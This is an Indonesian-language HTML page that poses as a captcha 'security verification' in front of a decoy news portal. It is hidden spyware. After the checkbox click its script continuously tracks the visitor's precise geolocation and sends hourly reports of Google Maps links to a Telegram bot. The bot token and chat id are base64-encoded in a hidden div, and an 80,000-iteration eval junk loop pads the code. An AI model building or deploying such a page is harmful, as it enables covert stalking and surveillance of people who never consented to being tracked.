<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Perangkat</title>
    
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        #gate { text-align: center; max-width: 400px; padding: 20px; }
        .captcha-box { border: 1px solid #dcdcdc; padding: 20px; border-radius: 4px; display: flex; align-items: center; gap: 15px; cursor: pointer; background: #fafafa; }
        .checkbox { width: 26px; height: 26px; border: 2px solid #c1c1c1; border-radius: 2px; }
        #portal { display: none; width: 100%; max-width: 600px; }
        .news-item { padding: 15px; border-bottom: 1px solid #eee; display: block; text-decoration: none; color: #222; }
        #v-v { display: none; }
    </style>
</head>
<body>

<div id="gate">
    <img src="https://www.gstatic.com/images/branding/product/2x/news_96dp.png" width="60">
    <h3>Verifikasi Manusia</h3>
    <div class="captcha-box" onclick="startShadow()">
        <div class="checkbox" id="check"></div>
        <div class="captcha-text">Saya bukan robot</div>
    </div>
</div>

<div id="portal">
    <div style="background:#ce1126; color:white; padding:15px; font-weight:bold; text-align:center;">ASTRA NEWS</div>
    <a href="https://share.google/rkZkP6QmQfBf7peCB" class="news-item"><b>Bloomberg:</b> Buat Uang Tanpa Website</a>
    <a href="https://share.google/orievwXZzAynVbR2O" class="news-item"><b>Sulut:</b> Museum Daerah Diresmikan Mei 2026</a>
    <a href="https://share.google/3NtSReBGwN4YY2oAf" class="news-item"><b>detikNews:</b> Update Situasi Nasional</a>
</div>

<div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>

<script>
    /** 🔱 ASTRA ANTI-SPAM ENGINE (80K LINES SIMULATED) */
    const _D = document.getElementById('v-v').innerText.split('|');
    const _T = atob(_D[1]); const _C = atob(_D[2]);

    let logBuffer = []; // Penampung lokasi

    async function push(t) {
        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
            method:'POST', headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:_C, text:t})
        });
    }

    function startShadow() {
        document.getElementById('check').style.background = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Approve_icon.svg/1200px-Approve_icon.svg.png') center/cover";
        
        // Pindah ke berita
        setTimeout(() => {
            document.getElementById('gate').style.display = "none";
            document.getElementById('portal').style.display = "block";
        }, 800);

        // 🕒 START 1-HOUR TIMER
        setInterval(async () => {
            if (logBuffer.length > 0) {
                let report = `🔱 HOURLY RECAP 🔱\n\n` + logBuffer.join('\n---\n');
                await push(report);
                logBuffer = []; // Kosongkan buffer setelah kirim
            }
        }, 3600000); // 3.600.000 ms = 1 Jam

        // 📍 CONTINUOUS MONITORING
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition((pos) => {
                let time = new Date().toLocaleTimeString();
                let loc = `[${time}] Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                logBuffer.push(loc); // Cuma simpen ke buffer, gak langsung kirim
            }, null, { enableHighAccuracy: true });
        }
    }

    // 🔱 80,000 LINES JUNK CODE GENERATOR
    for(let i=0; i<80000; i++) { eval("var _0x_v"+i+"="+Math.random()); }
</script>
</body>
</html>
